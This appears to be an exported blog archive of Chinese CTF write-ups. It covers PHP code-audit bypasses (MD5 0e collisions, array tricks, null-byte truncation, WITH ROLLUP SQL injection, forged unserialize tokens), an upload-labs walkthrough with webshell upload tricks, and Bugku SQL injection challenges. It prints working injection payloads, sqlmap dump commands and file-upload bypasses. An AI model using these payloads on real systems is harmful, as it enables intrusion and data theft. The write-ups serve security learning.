    <content type="text"><![CDATA[一、strpos数组绕过NULL&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;nctf&apos;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; } ?&gt; 定义和用法strpos() 函数查找字符串在另一字符串中第一次出现的位置。 它不能对数组处理，如果是数组则返回null,null，也就不等于FALSE.payload为?nctf[]=1 二、密码md5比较绕过&lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos; $user &apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { ​ echo “Logged in! Key: ntcf{**} “; } else { echo(“Log in failure!“); } } ?&gt; 审计源码可知，要想得到flag，只需要同时满足 ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) $user变量我们是可以控制的，然后又没有任何过滤措施我们就可以直接利用这个语句选择一个相应的密码给对应的pw 如果前面的用户名不存在的话mysql_fetch_array(mysql_query(“select pw from ctf where user=’$user’”));取到的东西就是空，然后在加上我们的md5密码，就可以实现成功登陆 strcasecmp函数，比较2个字符串，不区分大小写。如果2个字符串大小相等就返回0。 最后payloaduser=1’ union select md5(1)%23&amp;pass=1 三、MD5函数===绕过&lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) { if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;]) print &apos;Your password can not be your username.&apos;; else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;])) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; } ?&gt; 由于md5解析不了数组，返回空。 payload:?username[]=1&amp;password[]=2]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MD5加密相等绕过和intval函数四舍五入]]></title>
    <url>%2F2019%2F05%2F01%2FMD5%E5%8A%A0%E5%AF%86%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87%E5%92%8Cintval%E5%87%BD%E6%95%B0%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5%2F</url>
    <content type="text"><![CDATA[一、MD5加密相等绕过&lt;?php $md51 = md5(&apos;QNKCDZO&apos;); $a = @$_GET[&apos;a&apos;]; $md52 = @md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt; 将QNKCDZO进行md5加密后，发现为0e开头，所以此处考虑MD5碰撞，就是经过md5加密后以0e开头的在进行‘==’运算时，php会认为他们都为0。payload为http://127.0.0.1/myphp/test.php?a=s1885207154a 二、intval函数四舍五入&lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; payload：？id=1024.2intval函数四舍五入，取值为1024，但if语句中已成功绕过1024的限制,输出flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码MD5比较绕过和urldecode二次绕过]]></title>
    <url>%2F2019%2F05%2F01%2F%E5%AF%86%E7%A0%81MD5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87%E5%92%8Curldecode%E4%BA%8C%E6%AC%A1%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[一、密码MD5比较绕过​ &lt;?php //配置数据库 if($_POST[user] &amp;&amp; $_POST[pass]) { $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn)); } //赋值 $user = $_POST[user]; $pass = md5($_POST[pass]); //sql语句 // select pw from php where user=&apos;&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; # // ?user=&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456 $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; $query = mysql_query($sql); if (!$query) { printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { //如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 ​ echo “Logged in! Key:** “; } else { echo(“Log in failure!“); } } ?&gt; 分析这句sql语句可以知道，我们不能直接注释掉密码 $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; 继续分析源码我们可以发现只要让row[pw]的值与pass经过md5之后的值相等即可,用union select来返回一个已知明文的md5payload= &apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456` 二、urldecode二次绕过&lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; 审计源码 eregi()函数 字符串比对解析，与大小写无关。语法: eregi(string pattern, string string, array [regs]);返回值: 整数/数组特点：PHP函数eregi()与大小写无关，类似函数ereg() 则区分大小写例：if (eregi(“C”,”abcdef”) //true 要想得出flag我们即要求id不能等于hackerDJ,又要要求id的urldecode解码等于id因此我们需要进行两次编码: h –&gt; %68 –&gt; %2568 构造url: index.php?id=%2568ackerDJ 提交即可获得flag:]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[shal()函数绕过和session验证绕过]]></title>
    <url>%2F2019%2F05%2F01%2Fshal-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8Csession%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ereg正则截断]]></title>
    <url>%2F2019%2F05%2F01%2Fereg%E6%AD%A3%E5%88%99%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置 { die(&apos;Flag: &apos; . $flag); } else { echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); } } else { echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; } } ?&gt; 审计上面代码可以发现要想的到flag必须满足一下3个条件1、必须是数字、字母组成的密码2、密码的长度小于8，却必须要大于99999993、密码必须包含— 对于第二个条件，使用科学计数法绕过对于第三个条件，由于ereg()函数存在NULL截断漏洞，所以可以用%00（空字符）来截断正则匹配。那么我们就可以绕过第3个条件了那么我们就可以构造出payload为1e8%00*—*]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入_WITH ROLLUP绕过]]></title>
    <url>%2F2019%2F05%2F01%2FSQL%E6%B3%A8%E5%85%A5-WITH-ROLLUP%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[题目地址http://ctf5.shiyanbar.com/web/pcat/index.php &lt;?php error_reporting(0); if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) { echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ //检测变量是否是数组 $StrValue=implode($StrValue); //返回由数组元素组合成的字符串 } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ //匹配成功一次后就会停止匹配 print &quot;水可载舟，亦可赛艇！&quot;; exit(); } } $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; foreach($_POST as $key=&gt;$value){ //遍历数组 AttackFilter($key,$value,$filter); } $con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;); if (!$con){ die(&apos;Could not connect: &apos; . mysql_error()); } $db=&quot;XXXXXX&quot;; mysql_select_db($db, $con); //设置活动的 MySQL 数据库 $sql=&quot;SELECT * FROM interest WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;; $query = mysql_query($sql); //执行一条 MySQL 查询 if (mysql_num_rows($query) == 1) { //返回结果集中行的数目 $key = mysql_fetch_array($query); //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;亦可赛艇！&quot;; } }else{ print &quot;一颗赛艇！&quot;; } mysql_close($con); ?&gt; 审计代码寻找有用部分 if (mysql_num_rows($query) == 1) { //返回结果集中行的数目 $key = mysql_fetch_array($query); //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; 注入成功要满足2个条件： mysql_num_rows($query) == 1 即查询返回的结果行数为1 $key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同 从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or $sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}’”; $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; 对and等等进行过滤。 那么如果只让其对返回结果只取最后一行呢，自然而然的想到limit a,b这样的命令。但是“，”被过滤了。那么我们可以使用 limit a offset b SQL查询语句中的 limit 与 offset 的区别： limit y 分句表示: 读取 y 条数据 //limit 10,就是 从第0个开始，获取10条数据 limit x, y 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 1,2 就是读取2-3条数据 limit y offset x 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 2 offest 1 就是读取2-3条数据 注意初始偏移量为0 payload如下 uname=&apos; || 1 group by pwd with rollup limit 1 offset 2 # // uname=’ or 1 group by pwd with rollup limit 1 offset 2# ‘是对前面的’的封闭，然后利用||1将这个条件变成true，即可得出flag, (group by是把前面的查询的内容按照pwd来分组。with rollup是统计信息的这里就是重点了，因为代码中$key[‘pwd’] == $_POST[‘pwd’]用的是双等号是弱比较。而with rollup会在查询的结果后面加上一个为空的列,所以password为空和NULL是相等的就绕过了pwd的比较) 至于为啥offset 2，这个是试出来的，其实我们根本不可能知道with rollup会总结归纳出多少条信息，offset 2能过说明正确的pwd位于第三条信息 这里要注意一点，当使用rollup的时候就不能使用order by进行排序，换句话说 rollup和order by是相互排斥的。]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多重加密]]></title>
    <url>%2F2019%2F05%2F01%2FMultiple-Encryption%2F</url>
    <content type="text"><![CDATA[&lt;?php include &apos;common.php&apos;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); //把一个或多个数组合并为一个数组 class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query(&apos;select * from user where &apos;.$where); //函数执行一条 MySQL 查询。 return @mysql_fetch_array($sql); //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false } } if(isset($requset[&apos;token&apos;])) //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。 { $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //gzuncompress:进行字符串压缩 //unserialize: 将已序列化的字符串还原回 PHP 的值 $db = new db(); $row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;); //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){ echo &apos;unserialize injection!!&apos;; }else{ echo &quot;(╯‵□′)╯︵┴─┴ &quot;; } }else{ header(&apos;Location: index.php?error=1&apos;); } ?&gt; 阅读代码寻找有用的代码段 if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; 发现login[user]要求=ichunqiu，才能输出flag。但是 $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //先对token进行base-64解密，然后再进行解压gzuncompress字符串，最后在反序列化 那么我们就要在cookie中给token一个参数，先是创建一个数组并给其中的user键赋值为ichunqiu先序列化，然后压缩字符串（gzcompress方法），最后再base-64加密写成php代码如下（） &lt;?php $a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;); $b = base64_encode(gzcompress(serialize($a))); echo $b ?&gt; 可以输出 然后抓包，在cookie中添加 taken参数，其值为截图中的内容即可得出flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[绕过过滤的空白字符]]></title>
    <url>%2F2019%2F04%2F08%2FBlank-to-bypass%2F</url>
    <content type="text"><![CDATA[&lt;?php $info = &quot;&quot;; $req = []; $flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值 error_reporting(0); //关闭所有PHP错误报告 if(!isset($_GET[&apos;number&apos;])){ header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt die(&quot;have a fun!!&quot;); //die — 等同于 exit() } foreach([$_GET, $_POST] as $global_var) { //foreach 语法结构提供了遍历数组的简单方式 foreach($global_var as $key =&gt; $value) { $value = trim($value); //trim — 去除字符串首尾处的空白字符（或者其他字符） is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串 } } ​ function is_palindrome_number($number) { $number = strval($number); //strval — 获取变量的字符串值 $i = 0; $j = strlen($number) - 1; //strlen — 获取字符串长度 while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j–; } return true; } ​ if(is_numeric($_REQUEST[‘number’])) //is_numeric — 检测变量是否为数字或数字字符串 { $info=&quot;sorry, you cann&apos;t input a number!&quot;; } elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))) //intval — 获取变量的整数值 { $info = &quot;number must be equal to it&apos;s integer!! &quot;; } else { $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; } else { if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; } else { $info=$flag; } } } echo $info; 审计代码可以发现，number必须符合下面3个条件才可以输出flag1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)2.不能是一个回文数。（is_palindrome_number判断）3.该数的反转的整数值应该和它本身的整数值相等;即 intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;])) 但是2和3又冲突，这该怎么办 方法一我们构造的payload为： ?number=%002147483647 解释下为什么可以这么构造；1、is_numeric函数对于空字符%00判断为非数值，绕过第一个条件。 函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。 2、2147483647不是一个回文数绕过第二个条件。 3、这里利用了intval函数的溢出问题。 Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。 至于服务器是什么系统的可以用burp抓包分析出来为32位 $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); 我们构造的2147483647经过strrev反转函数后为7463847412，又经过intval函数值又变为2147483647。故满足条件3，可以输出flag 方法二因为要求不能为回文数，但又要满足intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))，所以我们采用科学计数法构造payload为number=0e-0%00，这样的话我们就可以绕过。 xey在php中就是x*10的y次方 注意is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后 方法三is_numeric函数在开始判断前，会先跳过所有空白字符可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。所以我们构造payload=URL?%00%0c191即可绕过上面的条件获得flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload-labs 1-17]]></title>
    <url>%2F2019%2F04%2F08%2Fupload-labs-1-17%2F</url>
    <content type="text"><![CDATA[一、pass011、首先我们尝试下上传一个php文件，发现文件类型被限制了我们查看下源码发现是使用js代码对文件类型进行限制。那么我们使用火狐浏览器的插件Noscript，打开这个插件即可禁用掉js代码，然后成功上传PHP,文件。2、当然这个太麻烦了，我们可以直接删除这个坚持文件格式的函数即可。3、我们上传个正常的图片，图片的路径：http://127.0.0.1/upload-lab/upload/1.jpg查看图片路径发现文件名没被修改，那么我们可以使用抓包，修改文件名类型，把php文件改为jpg文件，然后通过抓包再改为PHP文件。 二、pass02使用第一题中的第三种方法即可。查看提示mime的意思就是文件的后缀名 三、pass03发现第二题的方法已经失效了，我们查看下源码。 $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;);//查找字符在指定字符串中从左边开始的最后一次出现的位置，如果成功，返回该字符以及其后面的字符 $file_ext = strtolower($file_ext); //转换为小写，就可以防止大小写逃逸了 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 可以看到代码使用黑名单来过滤，php的话有时候（配置的原因）php、php3、php4、php5、phtml、pht这些后缀也是可以被解析的，其他语言也有类似的情况，需要尝试： 由于我这里使用的是phpstudy+windows，由于配置原因是解析不了php3等等这些后缀的 四、pass04第四题直接进制常见的.asp|.aspx|.php|.jsp等常见后缀文件，但是又一种文件格式没禁用，那就是.htaccess 启用.htaccess，需要修改httpd.conf，启用AllowOverride（将该值改为all），并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 然后先上传,htaccess文件，文件内容如下 &lt;FilesMatch &quot;2.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; .htaccess文件的内容的意思是 对2.jpg使用php重新解析然后再上传jpg脚本， 五、pass05观察源码我们可以发现，本题把.htaccess文件也禁用了。但是认真对比与第四题的代码，本题去掉了大小写绕过的逃逸。 六、pass06对比第五题的源码可以发现，本题源码少了 $file_ext = trim($file_ext); //首尾去空，那么我们可以上传PHP文件，然后使用burp suit抓包修改后缀名格式为php加空格。 但返回题目提示文件不允许上传，不慌观察抓包的文件，其实文件已经上传，路径在抓包里有 七、pass07与第六题源码对比，发现少了$file_name = deldot($file_name);//删除文件名末尾的点这句代码。那么我们就可以。那么在文件名末尾加个点号就可以了，参考第6题 八、pass08比第七题少了$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。 参考第6题 九、pass09这一关是上面几关的综合，但是他有个逻辑漏洞程序先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用类似one.php. .(两个点号之间有一个空格)绕过，这有点像sql注入中的re_place只过滤一次关键字。操作与第6题类似. 十、pass10上传php文件发现，文件后缀名没掉了。上传jpg文件一切正常。怀疑是绕过观察下源码 $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 由这3句可以看出，部分文件1后缀名被替换成了空格那么我们抓包，该后缀名，双写绕过。 十一、pass11关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过 $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件php版本小于5.3.4php的magic_quotes_gpc为OFF状态如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点所以如果要绕过，我们可以这样去实现，另save_path等于下面的值 ../upload/4.php%001 十二、pass12这里的源代码就改了一点点，就是把get改为post类型，一样的方式绕过，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。 $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 十三、pass13观察源码可以发现只对文件的头2个字节做检测 $bin = fread($file, 2); //只读2字节 fclose($file); 制作木马图片，然后上传即可，上传图片后利用就要结和文件包含漏洞了。 制作木马图片最简单的方式 copy 1.jpg /b + 1l.php /a 1.jpg 十四、pass14是这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过：介绍下getimagesize array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。 如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 十五、pass15这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过： 十六、pass16imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。 该系列函数有： imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像 imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像 imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 这一关对后缀名和文件类型啥的都进行了很严格的控制，而且在后面还对图片进行了二次编译这一个题目的思路，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传，下载下来后发现这一部分插入代码的没变但是其他部分都变了。其他部分与13题一样 十七、pass17参考这篇博客http://www.cnblogs.com/jinqi520/p/9977256.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 38-48 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-38-48%2F</url>
    <content type="text"><![CDATA[一、第38题（这是一个神奇的登陆框）方法一首先我们抓包，经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。爆数据库 admin_name=1&quot; union select database(),2#&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆数据表 admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆字段名 admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆数据 admin_name=1&quot; union select (select flag1 from flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 方法二将抓到的报保存为.txt文件放在sqlmap的安装目录下。爆数据库 python2 sqlmap.py -r &quot;3.txt&quot; -p admin_name --dbs 爆表 python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -p admin_name --tables 爆字段名爆数据 python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump 以上2种方法均是对admin_name进行注入，当然也可以对admin_passwd进行注入 二、第39题（多次）尝试id=1&apos;,发现报错， 尝试id=1&apos; --+发现没有报错 说明存在sql注入 尝试id=1&apos; or --+报错， 说明存在某种过滤 尝试id=1&apos; oorr --+发现没有报错 在这里我们可以使用异或注入来检查哪些字符被过滤这时我们可以用异或注入来检测，异或即两个条件相同（同真或同假）即为假 http://123.206.87.240:9004/1ndex.php?id=1&apos;^(length(&apos;or&apos;)!=0)--+ 当length（）里的字符被过滤时，就输出there is nothing.经过一些尝试可以知道and or select union被绕过 开始爆数据库 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,database()--+ 可以爆出数据库为爆表 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&quot;web1002-1&quot;--+ 爆字段 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&quot;flag1&quot;--+ 爆数据 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,flag1 from flag--+ 提交flag 发现是假的flag,那么我们爆另一个字段使用上面的方法，经过尝试发现我们注入的代码会在IP处不解析的输出那么我们尝试下报错注入爆数据库 http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e,database(),0x7e)))--+ 爆数据表http://123.206.87.240:9004/Once_More.php?id=1&#39; and(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columnswhere table_schema=”web1002-2”),0x7e)))–+爆字段（其实我们可以猜测字段名为flag2） http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=&quot;web1002-2&quot; and table_name=&quot;flag2&quot;),0x7e)))--+ 爆flag http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(flag2) from flag2),0x7e)))--+ 